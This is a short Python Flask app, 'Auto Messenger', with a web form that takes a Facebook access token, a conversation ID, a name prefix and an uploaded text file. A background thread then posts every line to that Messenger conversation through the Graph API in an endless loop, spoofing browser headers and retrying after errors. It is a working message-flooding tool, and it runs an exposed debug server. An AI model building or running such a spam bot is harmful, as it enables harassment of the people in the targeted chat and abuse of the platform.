from flask import Flask, request, render_template
import requests
import os
import threading
import time

app = Flask(__name__)
UPLOAD_FOLDER = 'static/images/'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Headers for Facebook API
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Function to send messages in the background
def send_messages(access_token, thread_id, mn, time_interval, messages):
    while True:
        try:
            for message1 in messages:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(f"✅ Message sent: {message}")
                else:
                    print(f"❌ Failed to send message: {message}")
                
                time.sleep(time_interval)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(30)  # Wait and retry

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx', 'Rocky Roy Roy')  # Default name
        time_interval = int(request.form.get('time', 5))

        # Upload and process text file
        if 'txtFile' in request.files:
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()
            
            # Start messaging in a new thread (Runs in background)
            thread = threading.Thread(target=send_messages, args=(access_token, thread_id, mn, time_interval, messages))
            thread.daemon = True
            thread.start()

        # Upload background image
        if 'bgImage' in request.files:
            bg_image = request.files['bgImage']
            if bg_image.filename != '':
                bg_image_path = os.path.join(UPLOAD_FOLDER, 'background.jpg')
                bg_image.save(bg_image_path)

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Auto Messenger</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background-image: url('/static/images/background.jpg');
                background-size: cover;
                background-position: center;
                background-attachment: fixed;
            }
            .container {
                max-width: 400px;
                background-color: rgba(255, 255, 255, 0.8);
                border-radius: 10px;
                padding: 20px;
                margin: 50px auto;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Upload Details</h2>
            <form action="/" method="post" enctype="multipart/form-data">
                <input type="text" name="accessToken" placeholder="Enter Access Token" class="form-control" required><br>
                <input type="text" name="threadId" placeholder="Enter Conversation ID" class="form-control" required><br>
                <input type="text" name="kidx" placeholder="Enter Name (Default: Rocky Roy Roy)" class="form-control"><br>
                <input type="file" name="txtFile" accept=".txt" class="form-control" required><br>
                <input type="number" name="time" placeholder="Interval (Seconds)" class="form-control" required><br>
                <input type="file" name="bgImage" accept="image/*" class="form-control"><br>
                <button type="submit" class="btn btn-primary">Start Messaging</button>
            </form>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
